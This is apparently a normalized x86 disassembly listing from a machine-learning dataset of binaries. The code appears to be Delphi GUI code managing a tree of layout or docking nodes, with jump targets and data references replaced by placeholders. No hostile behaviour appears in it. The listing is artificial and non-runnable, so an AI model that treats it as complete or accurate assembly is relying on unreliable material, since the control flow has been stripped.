test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4584dc
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_457fd0
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_457fd0
mov ecx ebx
pop edx
call sub_417380
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44f214
mov eax [ ebp - 0x4 ]
call sub_458404
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_458404
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_458404
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_458404
push ebx
mov ebx eax
mov eax ebx
call sub_457f0c
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_457e94
test al al
je r-xdata
mov eax ebx
call sub_457f40
pop ebx
retn
sub_458440
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45842c
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_457edc
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_458430
mov edx esi
call sub_458440
sub_45847c
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_458404
mov edi eax
mov eax ebx
call sub_457f40
cmp edi eax
jl r-xdata
mov eax esi
call sub_4580ec
mov eax [ esi + 0x1c ]
push eax
push sub_459f8c
mov edx esi
call sub_4587b8
mov eax ebx
call sub_458404
mov edi eax
mov eax esi
call sub_457f88
cmp edi eax
jle r-xdata
mov eax ebx
call sub_45847c
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_4584e8
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_457f0c
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_458510
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403280
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_4035fc
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_457eb8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424a18
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_429f0c
mov edx eax
mov eax ebx
call sub_424b94
mov eax [ ebp - 0x4 ]
call sub_4586e0
xor eax eax
push ebp
push sub_45861c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_452d84
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_4580ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458623
mov eax [ ebp - 0x4 ]
call sub_4586e4
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_452d48
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_458623
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_45a4b4
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_458678
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_4596e4
mov eax [ esi + 0x10 ]
call sub_4032b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_4586f8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_4586f8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_4586f8
pop ecx
sub_458750
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_4586f8
pop ecx
sub_45877c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_45877c
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_45877c
pop ecx
sub_4587d0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_458750
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_45803c
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_45803c
push eax
mov edx 0x1
mov eax ebx
call sub_457fd0
push eax
mov edx 0x2
mov eax ebx
call sub_457fd0
pop edx
pop ecx
call sub_417380
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402cc4
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_458854
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_45828c
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_417380
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44f214
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_457eb8
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_458750
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_457edc
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_45977c
mov edx esi
mov eax ebx
call sub_458750
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_44f7f8
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_457eb8
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_44f7e4
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_45803c
mov edx eax
mov eax edi
call sub_45842c
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_45803c
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_45803c
mov edx eax
mov eax edi
call sub_45842c
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_45803c
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_458a64
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_458c0c
jmp r-xdata
sub_458a64
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_457eb8
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_458404
mov edx eax
mov eax ebx
call sub_45842c
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_45842c
mov eax [ esi + 0x64 ]
call sub_458404
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_459ad4
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4587b8
mov eax [ esi + 0x64 ]
call sub_458404
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_459ad4
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4587b8
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_459e58
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4587b8
mov eax [ esi + 0x64 ]
call sub_458404
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_459f8c
xor edx edx
mov eax esi
call sub_4587b8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_45842c
adc edx 0x0
mov eax ebx
call sub_4580ec
mov eax ebx
call sub_45847c
push esi
push sub_459f8c
xor edx edx
mov eax esi
call sub_4587b8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_458c0c
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_4580ec
mov eax [ ebx + 0x14 ]
call sub_45847c
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_458c84
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_458404
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_458404
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_458404
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_457fd0
mov esi eax
mov edx 0x2
mov eax ebx
call sub_457fd0
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_458404
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_4584dc
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_458504
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4584dc
call sub_458c84
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_458504
call sub_458c84
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_45803c
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_45803c
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_458eb0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_452d84
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_452d48
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_417330
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458f44
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_458eb0
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_458504
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_458750
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_458504
call sub_458c84
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_458fcc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4040ac
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4046f8
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_459014
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45920c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_4596e4
mov eax [ ebp - 0x8 ]
call sub_4586e0
xor edx edx
push ebp
push sub_4591ef
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4591f6
mov eax [ ebp - 0x8 ]
call sub_4586e4
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_457eb8
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_458fcc
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_4034ac
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4581d8
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_458fcc
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_44f774
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_45056c
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_4032b0
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
